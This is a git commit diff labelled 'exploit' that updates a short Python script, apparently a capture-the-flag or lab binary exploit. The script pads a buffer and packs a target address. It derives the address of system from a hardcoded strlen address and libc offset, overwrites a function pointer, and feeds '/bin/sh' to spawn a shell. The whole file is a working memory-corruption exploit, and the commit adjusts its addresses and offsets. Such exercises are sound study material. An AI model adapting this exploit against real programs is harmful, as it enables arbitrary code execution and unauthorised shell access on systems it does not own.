f7cb9b6fe04e70a39695e4df3cff056369494d88
root <root@localhost.localdomain>
2020-02-20 15:06:53 +0100

    exploit

--- src/ex2.py
+++ src/ex2.py
@@ -1,17 +1,17 @@
 import sys
 import struct
-from pwn import *
+#from pwn import *
 
 
 pad = "AAAAAAAA"*4
 read_addr = struct.pack("<Q", 0x555555755030)
 s1 = pad + read_addr + "\n"
 
-strlen = 0x7ffff7a89190
+strlen = 0x7ffff7e7d710
 
 
 # step 2 arbitrary writing
-system = struct.pack("<Q", strlen-0xfd10)
+system = struct.pack("<Q", strlen-0x43720)
 s2 = system + "\n" + "/bin/sh\n"
 
 sys.stdout.write(s1 + s2)
